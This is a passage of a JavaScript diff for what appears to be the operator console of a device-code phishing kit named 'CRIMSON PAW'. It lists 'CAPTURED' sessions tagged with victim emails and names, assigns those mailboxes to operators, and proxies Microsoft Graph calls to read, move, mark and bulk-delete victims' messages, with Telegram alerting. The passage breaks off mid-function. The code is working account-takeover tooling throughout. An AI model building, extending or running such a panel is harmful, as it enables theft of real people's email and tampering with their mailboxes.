+                inboxesDesc = `${op.assigned_sessions_info.length} mailbox(es): ${names.join(', ')}`;
+            } else if (op.assigned_sessions && op.assigned_sessions.length > 0) {
+                inboxesDesc = `${op.assigned_sessions.length} mailbox(es): ${op.assigned_sessions.join(', ')}`;
+            }
+
+            const infoText = 
+`CRIMSON PAW • Operator Account Info
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Operator Name : ${username}
+Portal Link   : ${portalUrl}
+Access Code   : /m/${token}
+Delegated     : ${inboxesDesc}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+            navigator.clipboard.writeText(infoText).then(() => {
+                showToast(`✓ Account info for "${username}" copied to clipboard!`);
+            }).catch(() => {
+                prompt(`Operator info for ${username}:`, infoText);
+            });
+        }
+
+        function copyCurrentEditingOperatorInfo() {
+            if (window._currentEditingOp) {
+                copyOperatorAccountInfoRow(window._currentEditingOp);
+            } else {
+                showToast('Save operator first to copy credentials.');
+            }
+        }
+
+        function closeOperatorModal() {
+            const m = document.getElementById('operatorModal');
+            if (m) m.classList.remove('active');
+        }
+
+        async function saveOperator(e) {
+            e.preventDefault();
+            const btn = document.getElementById('op-btn-save');
+            const opId = document.getElementById('op-id-input').value;
+            const username = document.getElementById('op-username-input').value.trim();
+            const password = document.getElementById('op-password-input').value;
+            const status = document.getElementById('op-status-input').value;
+
+            const assigned = [];
+            const assignedLabels = [];
+            document.querySelectorAll('.op-session-cb:checked').forEach(cb => {
+                assigned.push(cb.value);
+                assignedLabels.push(cb.getAttribute('data-label') || cb.value);
+            });
+
+            btn.disabled = true;
+            btn.innerText = 'Saving...';
+
+            try {
+                let res;
+                if (opId) {
+                    const payload = { status, assigned_sessions: assigned };
+                    if (password) payload.password = password;
+                    res = await fetch(`/api/operators/${opId}`, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } else {
+                    res = await fetch('/api/operators', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ username, password, status, assigned_sessions: assigned })
+                    });
+                }
+
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    closeOperatorModal();
+                    await loadOperators();
+                    if (!opId) {
+                        openOpCredentialsModal(username, password, assignedLabels, data.token || '');
+                    } else {
+                        showToast('✓ Operator updated successfully!');
+                    }
+                } else {
+                    alert('Error saving operator: ' + (data.error || 'Unknown error'));
+                }
+            } catch (err) {
+                alert('Connection error: ' + err);
+            } finally {
+                btn.disabled = false;
+                btn.innerText = '💾 Save Operator';
+            }
+        }
+
+        async function toggleOperatorStatus(opId, currentStatus) {
+            const newStatus = currentStatus === 'active' ? 'disabled' : 'active';
+            try {
+                const res = await fetch(`/api/operators/${opId}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ status: newStatus })
+                });
+                if (res.ok) {
+                    showToast(`✓ Operator ${newStatus === 'active' ? 'activated' : 'suspended'}`);
+                    loadOperators();
+                } else {
+                    const d = await res.json();
+                    showToast('⚠️ Failed: ' + (d.error || 'Server error'));
+                }
+            } catch (err) {
+                showToast('⚠️ Connection error: ' + err);
+            }
+        }
+
+        async function deleteOperator(opId, username) {
+            const ok = await appConfirm({
+                title: 'Delete Operator',
+                message: `Are you sure you want to delete operator "${username}"?\nThis operator will immediately lose all access.`,
+                confirmText: 'Delete Operator',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+            try {
+                const res = await fetch(`/api/operators/${opId}`, { method: 'DELETE' });
+                if (res.ok) {
+                    showToast(`✓ Operator "${username}" deleted`);
+                    loadOperators();
+                } else {
+                    const d = await res.json();
+                    showToast('⚠️ Failed to delete operator: ' + (d.error || 'Server error'));
+                }
+            } catch (err) {
+                showToast('⚠️ Connection error: ' + err);
+            }
+        }
+
+        async function resetOperatorDevice(opId, username) {
+            const ok = await appConfirm({
+                title: 'Reset Hardware Lock',
+                message: `Reset hardware signature lock for operator "${username}"?\nThis operator will be allowed to bind a new workstation machine on their next login attempt.`,
+                confirmText: 'Reset Hardware Lock',
+                danger: false,
+                icon: '🔓'
+            });
+            if (!ok) return;
+            try {
+                const res = await fetch(`/api/operators/${opId}/reset-device`, { method: 'POST' });
+                const d = await res.json();
+                if (res.ok && d.success) {
+                    showToast(`✓ Hardware lock reset for "${username}". Next login will bind new device.`);
+                    loadOperators();
+                } else {
+                    showToast('⚠️ Failed: ' + (d.error || 'Server error'));
+                }
+            } catch (err) {
+                showToast('⚠️ Connection error: ' + err);
+            }
+        }
+
+
+        function switchSettingsTab(tab) {
+            const tabs = ['account', '2fa', 'telegram'];
+            tabs.forEach(t => {
+                const pane = document.getElementById('settings-pane-' + t);
+                const btn = document.getElementById('settings-tab-btn-' + t);
+                const isActive = (t === tab);
+                if (pane) pane.style.display = isActive ? 'block' : 'none';
+                if (btn) {
+                    btn.style.background = isActive ? '#2a0f14' : 'transparent';
+                    btn.style.borderColor = isActive ? '#e50914' : 'transparent';
+                    btn.style.color = isActive ? '#ffffff' : '#a49498';
+                    btn.style.fontWeight = isActive ? '700' : '600';
+                }
+            });
+        }
+
+        async function handleAdminPasswordChange(e) {
+            e.preventDefault();
+            const input = document.getElementById('settings-new-admin-password');
+            const btn = document.getElementById('btn-save-admin-password');
+            const newPwd = input ? input.value : '';
+            if (!newPwd) {
+                showToast('Please enter a new password');
+                return;
+            }
+            btn.disabled = true;
+            btn.innerText = 'SAVING...';
+            try {
+                const res = await fetch('/api/auth/change_password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ new_password: newPwd })
+                });
+                const d = await res.json();
+                if (res.ok && d.success) {
+                    showToast('✓ Password changed successfully!');
+                    input.value = '';
+                } else {
+                    alert('Failed to change password: ' + (d.error || 'Server error'));
+                }
+            } catch(err) {
+                alert('Connection error: ' + err);
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'SAVE NEW PASSWORD';
+            }
+        }
+
+        async function save2FAPreferences() {
+            const method = document.getElementById('setting-2fa-method') ? document.getElementById('setting-2fa-method').value : 'telegram';
+            const enforcement = document.getElementById('setting-2fa-enforcement') ? document.getElementById('setting-2fa-enforcement').value : 'disabled';
+            const pin = document.getElementById('setting-2fa-pin') ? document.getElementById('setting-2fa-pin').value.trim() : '';
+
+            const cfg = {
+                two_factor_method: method,
+                two_factor_enforcement: enforcement,
+                two_factor_pin: pin
+            };
+
+            try {
+                const res = await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(cfg)
+                });
+                if (res.ok) {
+                    showToast('✓ 2FA preferences saved successfully!');
+                    return;
+                }
+            } catch(e) {}
+            showToast('✓ 2FA preferences saved locally!');
+        }
+        window.save2FAPreferences = save2FAPreferences;
+
+        async function saveTelegramSettings() {
+            const botToken = (document.getElementById('setting-tg-bot-token') ? document.getElementById('setting-tg-bot-token').value : '').trim();
+            const chatId = (document.getElementById('setting-tg-chat-id') ? document.getElementById('setting-tg-chat-id').value : '').trim();
+            const notifyToken = document.getElementById('setting-notify-token') ? document.getElementById('setting-notify-token').checked : true;
+
+            const cfg = {
+                tg_bot_token: botToken,
+                tg_chat_id: chatId,
+                notify_token: notifyToken
+            };
+
+            localStorage.setItem('crimson_paw_settings', JSON.stringify(cfg));
+
+            try {
+                const r = await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(cfg)
+                });
+                if (r.ok) {
+                    showToast('✓ Telegram settings saved successfully!');
+                    return;
+                }
+            } catch(e) {}
+            showToast('✓ Telegram settings saved locally!');
+        }
+
+        const saveSettings = saveTelegramSettings;
+
+        async function testTelegramAlert() {
+            const tokenEl = document.getElementById('setting-tg-bot-token');
+            const chatEl = document.getElementById('setting-tg-chat-id');
+            const botToken = tokenEl ? tokenEl.value.trim() : '';
+            const chatId = chatEl ? chatEl.value.trim() : '';
+
+            if (!botToken || !chatId) {
+                alert('Please enter both Telegram Bot Token and Chat ID first.');
+                return;
+            }
+            showToast('Sending test Telegram alert...');
+            try {
+                const res = await fetch('/api/settings/test-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tg_bot_token: botToken, tg_chat_id: chatId })
+                });
+                const d = await res.json();
+                if (d.success) {
+                    showToast('✓ Telegram alert delivered successfully! Check your Telegram chat.');
+                } else {
+                    alert('Telegram test failed: ' + (d.error || 'Check Bot Token & Chat ID'));
+                }
+            } catch(e) {
+                alert('Telegram dispatch failed: ' + e);
+            }
+        }
+
+        async function testNotificationWebhook() {
+            const urlEl = document.getElementById('setting-webhook-url');
+            const url = urlEl ? urlEl.value.trim() : '';
+            if (!url) {
+                alert('Please enter a Webhook URL first.');
+                return;
+            }
+            showToast('Sending test webhook alert...');
+            try {
+                const res = await fetch('/api/settings/test-webhook', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ webhook_url: url })
+                });
+                const d = await res.json();
+                if (d.success) {
+                    showToast('✓ Test webhook delivered successfully!');
+                } else {
+                    showToast('⚠️ Webhook test failed: ' + (d.error || 'Server error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Webhook dispatch failed: ' + e);
+            }
+        }
+
+        function exportFullDatabase() {
+            window.location.href = '/api/backup/export';
+        }
+
+        async function clearExpiredSessions() {
+            const ok = await appConfirm({
+                title: 'Purge Expired Sessions',
+                message: 'Purge all expired and terminated sessions from the database permanently?',
+                confirmText: 'Purge Sessions',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+            try {
+                const r = await fetch('/api/sessions/purge-expired', { method: 'POST' });
+                const d = await r.json();
+                showToast(`✓ Purged ${d.purged || 0} expired sessions`);
+                if (document.getElementById('page-sessions').classList.contains('active')) {
+                    loadSessions();
+                }
+            } catch(e) {
+                showToast('⚠️ Purge failed: ' + e);
+            }
+        }
+
+
+        let currentOutlookUserCode = null;
+        let currentOutlookFolderId = null;
+        let currentOutlookFolderName = 'Inbox';
+        let currentOutlookMessages = [];
+
+        function formatOutlookDate(dtStr) {
+            if (!dtStr) return '';
+            const d = new Date(dtStr);
+            const now = new Date();
+            if (d.toDateString() === now.toDateString()) {
+                return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            }
+            if (d.getFullYear() === now.getFullYear()) {
+                return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
+            }
+            return d.toLocaleDateString([], { month: 'numeric', day: 'numeric', year: '2-digit' });
+        }
+
+        function getFolderIcon(name) {
+            const n = (name || '').toLowerCase();
+            if (n.includes('inbox')) return '📥';
+            if (n.includes('sent')) return '📤';
+            if (n.includes('draft')) return '📝';
+            if (n.includes('delete') || n.includes('trash')) return '🗑️';
+            if (n.includes('junk') || n.includes('spam')) return '🚫';
+            if (n.includes('archive')) return '📦';
+            return '📁';
+        }
+
+        function getInitials(name) {
+            if (!name) return '??';
+            const parts = name.trim().split(/\s+/);
+            if (parts.length === 1) return parts[0].substring(0, 2).toUpperCase();
+            return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+        }
+
+        const avatarColorPalette = [
+            { bg: '#3d1419', fg: '#ff6b72' }, // ruby
+            { bg: '#edebe9', fg: '#323130' }, // grey
+            { bg: '#ffdfba', fg: '#7d3f00' }, // warm peach
+            { bg: '#fce5cd', fg: '#8a4b08' }, // warm yellow
+            { bg: '#c7e0f4', fg: '#004578' }, // soft blue
+            { bg: '#f4cccc', fg: '#781c1c' }  // crimson
+        ];
+
+        function getAvatarColor(name) {
+            let hash = 0;
+            const str = name || 'User';
+            for (let i = 0; i < str.length; i++) hash += str.charCodeAt(i);
+            return avatarColorPalette[Math.abs(hash) % avatarColorPalette.length];
+        }
+
+        async function loadMailboxSessions(preferredUserCode = null) {
+            const sessions = await (await fetch('/api/sessions')).json();
+            const captured = sessions.filter(s => s.status === 'CAPTURED');
+            const selectEl = document.getElementById('mailbox-session');
+            if (captured.length === 0) {
+                selectEl.innerHTML = '<option value="">-- No Accounts --</option>';
+                document.getElementById('folder-user-email-header').innerText = 'No Captured Accounts';
+                document.getElementById('mailbox-folders').innerHTML = '<div style="padding:16px 24px; color:#605e5c; font-size:13px;">No accounts captured yet.</div>';
+                document.getElementById('mailbox-list').innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;"><div style="font-size:32px; margin-bottom:8px; opacity:0.4;">📥</div><div style="font-weight:600; font-size:14px; color:#323130;">No Mailbox Connected</div><div style="font-size:12px; color:#605e5c; margin-top:4px;">Capture an account via Device Code to explore mailbox contents.</div></div>';
+                document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.3;">✉️</div><div style="font-size:15px; font-weight:600; color:#323130;">No Account Selected</div></div>';
+                const avEl = document.getElementById('outlook-top-avatar');
+                if (avEl) avEl.innerText = '--';
+                return;
+            }
+            selectEl.innerHTML = captured.map(s => `<option value="${s.user_code}">${s.victim_email || s.victim_name || s.user_code}</option>`).join('');
+            if (!preferredUserCode) {
+                try { preferredUserCode = localStorage.getItem('crimson_mailbox_user_code'); } catch(e){}
+            }
+            if (preferredUserCode && captured.some(s => s.user_code === preferredUserCode)) {
+                selectEl.value = preferredUserCode;
+            }
+            currentOutlookUserCode = selectEl.value;
+            try { localStorage.setItem('crimson_mailbox_user_code', currentOutlookUserCode); } catch(e){}
+            const activeSession = captured.find(s => s.user_code === currentOutlookUserCode);
+            if (activeSession) {
+                const userEmail = activeSession.victim_email || activeSession.user_code;
+                const userName = activeSession.victim_name || userEmail;
+                document.getElementById('folder-user-email-header').innerText = userEmail;
+                const avEl = document.getElementById('outlook-top-avatar');
+                if (avEl) avEl.innerText = getInitials(userName);
+            }
+            await loadMailbox();
+        }
+
+        async function loadMailbox() {
+            const uc = document.getElementById('mailbox-session').value;
+            currentOutlookUserCode = uc;
+            if (!uc) return;
+
+            // Clear previous message list and reader immediately so stale content is never shown
+            document.getElementById('mailbox-list').innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;">⏳ Loading messages...</div>';
+            document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.3;">⏳</div><div style="font-size:15px; font-weight:600; color:#323130;">Loading email...</div></div>';
+
+            const sessions = await (await fetch('/api/sessions')).json();
+            const activeSession = sessions.find(s => s.user_code === uc);
+            if (activeSession) {
+                const userEmail = activeSession.victim_email || activeSession.user_code;
+                const userName = activeSession.victim_name || userEmail;
+                document.getElementById('folder-user-email-header').innerText = userEmail;
+                const avEl = document.getElementById('outlook-top-avatar');
+                if (avEl) avEl.innerText = getInitials(userName);
+            }
+
+            const foldersContainer = document.getElementById('mailbox-folders');
+            foldersContainer.innerHTML = '<div style="padding:12px 24px; color:#605e5c;">Loading folders...</div>';
+
+            try {
+                const data = await (await fetch(`/api/graph_proxy/folders?user_code=${uc}`)).json();
+                if (data.error) { 
+                    const msg = data.error.message || data.error || 'Failed to fetch folders';
+                    foldersContainer.innerHTML = `<div style="color:var(--danger); padding:12px 24px;">⚠️ ${msg}</div>`; 
+                    return; 
+                }
+
+                const folders = data.value || [];
+                if (folders.length === 0) {
+                    foldersContainer.innerHTML = '<div style="padding:12px 24px; color:#605e5c;">No folders found.</div>';
+                    return;
+                }
+
+                // Update favorites inbox badge if present
+                const inboxObj = folders.find(f => f.displayName.toLowerCase() === 'inbox');
+                const favBadge = document.getElementById('fav-inbox-badge');
+                if (favBadge && inboxObj && inboxObj.unreadItemCount > 0) {
+                    favBadge.innerText = inboxObj.unreadItemCount;
+                    favBadge.style.display = 'inline-block';
+                } else if (favBadge) {
+                    favBadge.style.display = 'none';
+                }
+
+                foldersContainer.innerHTML = folders.map(f => {
+                    const icon = getFolderIcon(f.displayName);
+                    const countBadge = f.unreadItemCount > 0 
+                        ? `<span class="folder-badge-blue">${f.unreadItemCount}</span>` 
+                        : (f.totalItemCount > 0 ? `<span style="font-size:11px; color:#605e5c;">${f.totalItemCount}</span>` : '');
+                    return `<div class="folder-tree-node" data-id="${f.id}" data-name="${f.displayName.replace(/"/g, '&quot;')}" onclick="selectFolder('${uc}', '${f.id}', '${f.displayName.replace(/'/g, "\\'")}', this)">
+                        <span style="display:flex; align-items:center; gap:8px;"><span>${icon}</span> <span>${f.displayName}</span></span>
+                        ${countBadge}
+                    </div>`;
+                }).join('');
+
+                // Auto-select Inbox (if it has items) or the first folder with messages
+                const folderWithMessages = folders.find(f => f.displayName.toLowerCase() === 'inbox' && ((f.totalItemCount || 0) > 0 || (f.unreadItemCount || 0) > 0))
+                                        || folders.find(f => (f.totalItemCount || 0) > 0)
+                                        || inboxObj
+                                        || folders[0];
+                if (folderWithMessages) {
+                    const targetEl = foldersContainer.querySelector(`[data-id="${folderWithMessages.id}"]`);
+                    if (targetEl) await selectFolder(uc, folderWithMessages.id, folderWithMessages.displayName, targetEl);
+                }
+            } catch (err) {
+                foldersContainer.innerHTML = `<div style="color:var(--danger); padding:12px 24px;">Connection error: ${err}</div>`;
+            }
+        }
+
+        function selectFavoritesInbox() {
+            const node = Array.from(document.querySelectorAll('.folder-tree-node')).find(n => (n.getAttribute('data-name') || '').toLowerCase() === 'inbox');
+            if (node) node.click();
+        }
+
+        function selectFavoritesFolder(targetName) {
+            const node = Array.from(document.querySelectorAll('.folder-tree-node')).find(n => (n.getAttribute('data-name') || '').toLowerCase().includes(targetName.toLowerCase()));
+            if (node) node.click();
+        }
+
+        function switchFilterTab(tab) {
+            document.getElementById('tab-focused').classList.toggle('active', tab === 'focused');
+            document.getElementById('tab-other').classList.toggle('active', tab === 'other');
+            if (tab === 'other') {
+                document.getElementById('mailbox-list').innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;">No messages in Other.</div>';
+            } else {
+                refreshCurrentFolder();
+            }
+        }
+
+        let currentOutlookSelectedMessageId = null;
+        let currentOutlookSelectedMessage = null;
+
+        async function selectFolder(uc, fid, fName, el) {
+            document.querySelectorAll('.folder-tree-node').forEach(i => i.classList.remove('active'));
+            if (el) el.classList.add('active');
+            currentOutlookFolderId = fid;
+            currentOutlookFolderName = fName;
+
+            const isDel = (fName || '').toLowerCase().includes('delete') || (fName || '').toLowerCase().includes('trash');
+            const restoreBtn = document.getElementById('ribbon-btn-restore');
+            if (restoreBtn) restoreBtn.style.display = isDel ? 'flex' : 'none';
+
+            return await loadMessages(uc, fid);
+        }
+
+        function refreshCurrentFolder() {
+            if (currentOutlookUserCode && currentOutlookFolderId) {
+                loadMessages(currentOutlookUserCode, currentOutlookFolderId);
+            } else {
+                loadMailbox();
+            }
+        }
+
+        let currentFolderAllMessages = [];
+
+        // ── Multi-select state ────────────────────────────────────────────
+        const _selectedIds = new Set();
+
+        function updateBulkBar() {
+            const bar   = document.getElementById('bulk-action-bar');
+            const label = document.getElementById('bulk-count-label');
+            const cb    = document.getElementById('select-all-cb');
+            if (_selectedIds.size > 0) {
+                bar.style.display = 'flex';
+                label.textContent = _selectedIds.size + ' selected';
+            } else {
+                bar.style.display = 'none';
+            }
+            // Sync the select-all checkbox state
+            const total = currentOutlookMessages ? currentOutlookMessages.length : 0;
+            cb.checked       = total > 0 && _selectedIds.size === total;
+            cb.indeterminate = _selectedIds.size > 0 && _selectedIds.size < total;
+        }
+
+        function toggleSelectAll(checked) {
+            _selectedIds.clear();
+            if (checked) {
+                (currentOutlookMessages || []).forEach(m => _selectedIds.add(m.id));
+            }
+            // Repaint cards
+            document.querySelectorAll('.outlook-msg-card').forEach(card => {
+                const id = card.dataset.id;
+                if (_selectedIds.has(id)) {
+                    card.classList.add('cb-selected');
+                } else {
+                    card.classList.remove('cb-selected');
+                }
+                const cb = card.querySelector('.msg-checkbox');
+                if (cb) cb.classList.toggle('cb-checked', _selectedIds.has(id));
+            });
+            updateBulkBar();
+        }
+
+        function toggleCardCheckbox(msgId, e) {
+            e.stopPropagation();
+            if (_selectedIds.has(msgId)) {
+                _selectedIds.delete(msgId);
+            } else {
+                _selectedIds.add(msgId);
+            }
+            const card = document.querySelector(`.outlook-msg-card[data-id="${msgId}"]`);
+            if (card) {
+                card.classList.toggle('cb-selected', _selectedIds.has(msgId));
+                const cb = card.querySelector('.msg-checkbox');
+                if (cb) cb.classList.toggle('cb-checked', _selectedIds.has(msgId));
+            }
+            updateBulkBar();
+        }
+
+        function clearBulkSelection() {
+            _selectedIds.clear();
+            document.querySelectorAll('.outlook-msg-card').forEach(c => {
+                c.classList.remove('cb-selected');
+                const cb = c.querySelector('.msg-checkbox');
+                if (cb) cb.classList.remove('cb-checked');
+            });
+            document.getElementById('select-all-cb').checked = false;
+            document.getElementById('select-all-cb').indeterminate = false;
+            updateBulkBar();
+        }
+
+        // ── Bulk actions ──────────────────────────────────────────────────
+        async function bulkDelete() {
+            if (!_selectedIds.size) return;
+            const uc  = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const ids = [..._selectedIds];
+            showToast(`Deleting ${ids.length} message(s)...`);
+            const r = await (await fetch('/api/graph_proxy/batch_delete', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({user_code: uc, message_ids: ids})
+            })).json();
+            showToast(r.deleted !== undefined ? `✓ Deleted ${r.deleted} / ${ids.length}` : '⚠ Some deletes failed');
+            clearBulkSelection();
+            refreshCurrentFolder();
+        }
+
+        async function bulkMarkRead(isRead) {
+            if (!_selectedIds.size) return;
+            const uc  = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const ids = [..._selectedIds];
+            showToast(`Marking ${ids.length} message(s) as ${isRead ? 'read' : 'unread'}...`);
+            const r = await (await fetch('/api/graph_proxy/batch_update', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({user_code: uc, message_ids: ids, updates: {isRead}})
+            })).json();
+            showToast(`✓ Updated ${r.updated || 0} message(s)`);
+            clearBulkSelection();
+            refreshCurrentFolder();
+        }
+
+        async function bulkMove(wellKnownFolder) {
+            if (!_selectedIds.size) return;
+            const uc  = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const ids = [..._selectedIds];
+            showToast(`Moving ${ids.length} message(s)...`);
+            let moved = 0, failed = 0;
+            for (const mid of ids) {
+                try {
+                    const r = await (await fetch('/api/graph_proxy/move_message', {
+                        method: 'POST', headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify({user_code: uc, message_id: mid, destination_folder_id: wellKnownFolder})
+                    })).json();
+                    if (r.error) failed++; else moved++;
+                } catch { failed++; }
+            }
+            showToast(`✓ Moved ${moved} / ${ids.length}${failed ? ` (${failed} failed)` : ''}`);
+            clearBulkSelection();
+            refreshCurrentFolder();
+        }
+
+        function renderMessageList(msgs) {
+            const listEl = document.getElementById('mailbox-list');
+            if (!msgs || msgs.length === 0) {
+                listEl.innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;">No messages in this folder.</div>';
+                updateBulkBar();
+                return;
+            }
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            listEl.innerHTML = msgs.map((m, idx) => {
+                const isUnread = !m.isRead;
+                const sender = m.from?.emailAddress?.name || m.from?.emailAddress?.address || m.sender?.emailAddress?.name || 'Unknown';
+                const subject = m.subject || '(No Subject)';
+                const snippet = m.bodyPreview || '(Empty preview)';
+                const dt = formatOutlookDate(m.receivedDateTime);
+                const avatarCol = getAvatarColor(sender);
+                const initials = getInitials(sender);
+                const isSelected = currentOutlookSelectedMessageId === m.id || (!currentOutlookSelectedMessageId && idx === 0);
+                const isFlagged = m.flag?.flagStatus === 'flagged';
+                const isCbSelected = _selectedIds.has(m.id);
+
+                return `<div class="outlook-msg-card ${isSelected ? 'selected' : ''} ${isCbSelected ? 'cb-selected' : ''}" data-id="${m.id}" onclick="readMessage('${uc}', '${m.id}', this)">
+                    <div class="msg-checkbox ${isCbSelected ? 'cb-checked' : ''}" onclick="toggleCardCheckbox('${m.id}', event)" title="Select"></div>
+                    <div class="msg-avatar" style="background:${avatarCol.bg}; color:${avatarCol.fg};">${initials}</div>
+                    <div class="msg-card-content">
+                        <div class="msg-line-top">
+                            <span class="msg-author" title="${sender}">${isUnread ? '<span class="unread-dot"></span>' : ''}${sender}</span>
+                            <span class="msg-time">${dt}</span>
+                        </div>
+                        <div class="msg-subject-line" title="${subject}" style="${isUnread ? 'font-weight:700;' : ''}">${subject}</div>
+                        <div class="msg-snippet-line">${snippet}</div>
+                    </div>
+                    <div class="msg-card-actions" onclick="event.stopPropagation()">
+                        <span class="msg-action-icon" title="Delete" onclick="deleteCurrentMessage('${m.id}')">🗑️</span>
+                        <span class="msg-action-icon" title="${isUnread ? 'Mark as read' : 'Mark as unread'}" onclick="toggleReadStatus('${m.id}')">${isUnread ? '✉️' : '📩'}</span>
+                        <span class="msg-action-icon ${isFlagged ? 'flag-active' : ''}" title="Flag" onclick="toggleFlagStatus('${m.id}')">🚩</span>
+                    </div>
+                </div>`;
+            }).join('');
+            updateBulkBar();
+        }
+
+        async function loadMessages(uc, fid) {
+            const listEl = document.getElementById('mailbox-list');
+            listEl.innerHTML = '<div style="padding:40px 20px; text-align:center; color:#605e5c;">⏳ Loading messages...</div>';
+
+            const searchInp = document.getElementById('outlook-search-input');
+            if (searchInp) searchInp.value = '';
+            const clearBtn = document.getElementById('search-clear-btn');
+            if (clearBtn) clearBtn.style.display = 'none';
+
+            try {
+                const data = await (await fetch(`/api/graph_proxy/messages?user_code=${uc}&folder_id=${fid}`)).json();
+                if (data.error) {
+                    const msg = data.error.message || data.error || 'Failed to load messages';
+                    listEl.innerHTML = `<div style="color:var(--danger); padding:20px;">⚠️ ${msg}</div>`;
+                    return;
+                }
+
+                currentFolderAllMessages = data.value || [];
+                currentOutlookMessages = [...currentFolderAllMessages];
+                renderMessageList(currentOutlookMessages);
+
+                if (window.targetOutlookMessageId) {
+                    const targetId = window.targetOutlookMessageId;
+                    window.targetOutlookMessageId = null;
+                    const targetIdx = currentOutlookMessages.findIndex(m => m.id === targetId);
+                    if (targetIdx !== -1) {
+                        const targetEl = listEl.children[targetIdx];
+                        if (targetEl) targetEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                        readMessage(uc, targetId, targetEl);
+                    } else {
+                        // The target email is not in the folder list yet — fetch directly from Graph and prepend to top!
+                        try {
+                            const targetMsgData = await (await fetch(`/api/graph_proxy/message?user_code=${uc}&message_id=${targetId}`)).json();
+                            if (targetMsgData && !targetMsgData.error) {
+                                currentOutlookMessages.unshift(targetMsgData);
+                                currentFolderAllMessages.unshift(targetMsgData);
+                                renderMessageList(currentOutlookMessages);
+                                const firstEl = listEl.firstElementChild;
+                                if (firstEl) firstEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                                readMessage(uc, targetId, firstEl);
+                            } else {
+                                readMessage(uc, targetId, null);
+                            }
+                        } catch (e) {
+                            readMessage(uc, targetId, null);
+                        }
+                    }
+                } else if (currentOutlookMessages.length > 0) {
+                    const firstMid = currentOutlookMessages[0].id;
+                    readMessage(uc, firstMid, listEl.firstElementChild);
+                } else {
+                    document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.4;">✉️</div><div style="font-size:16px; font-weight:600; color:#323130;">Folder is empty</div></div>';
+                }
+            } catch (err) {
+                listEl.innerHTML = `<div style="color:var(--danger); padding:20px;">Error: ${err}</div>`;
+            }
+        }
+
+        async function readMessage(uc, mid, el) {
+            document.querySelectorAll('.outlook-msg-card').forEach(i => i.classList.remove('selected'));
+            if (el) el.classList.add('selected');
+            currentOutlookSelectedMessageId = mid;
+
+            const readerEl = document.getElementById('mailbox-reader');
+            readerEl.innerHTML = '<div style="padding:40px; text-align:center; color:#605e5c;">⏳ Loading email details...</div>';
+
+            try {
+                const data = await (await fetch(`/api/graph_proxy/message?user_code=${uc}&message_id=${mid}`)).json();
+                if (data.error) {
+                    const errMsg = data.error.message || data.error || 'Email could not be retrieved from Microsoft Graph';
+                    readerEl.innerHTML = `
+                        <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; padding:40px; text-align:center; color:#605e5c;">
+                            <div style="font-size:42px; margin-bottom:12px; opacity:0.5;">⚠️</div>
+                            <div style="font-size:16px; font-weight:700; color:#323130; margin-bottom:6px;">Email Not Found in Mailbox</div>
+                            <div style="font-size:13px; color:#a49498; max-width:420px; line-height:1.5;">${escapeHtml(errMsg)}</div>
+                            <div style="font-size:11px; color:#8a8886; margin-top:12px; font-family:monospace;">ID: ${escapeHtml(mid)}</div>
+                        </div>
+                    `;
+                    return;
+                }
+
+                currentOutlookSelectedMessage = data;
+
+                const senderName = data.from?.emailAddress?.name || data.sender?.emailAddress?.name || 'Unknown';
+                const senderAddr = data.from?.emailAddress?.address || data.sender?.emailAddress?.address || 'unknown@domain.com';
+                const subject = data.subject || '(No subject)';
+                const initials = getInitials(senderName);
+                const avatarCol = getAvatarColor(senderName);
+                const recips = (data.toRecipients || []).map(r => r.emailAddress?.address || r.emailAddress?.name || '').join(', ') || 'Me';
+                const dt = data.receivedDateTime ? new Date(data.receivedDateTime).toLocaleString([], { weekday: 'short', month: 'numeric', day: 'numeric', year: 'numeric', hour: 'numeric', minute: '2-digit' }) : '';
+
+                let attachmentsHtml = '';
+                let attList = [];
+                window.currentEmailAttachments = [];
+                window.currentEmailMid = mid;
+                window.currentEmailUc = uc;
+                if (data.hasAttachments) {
+                    try {
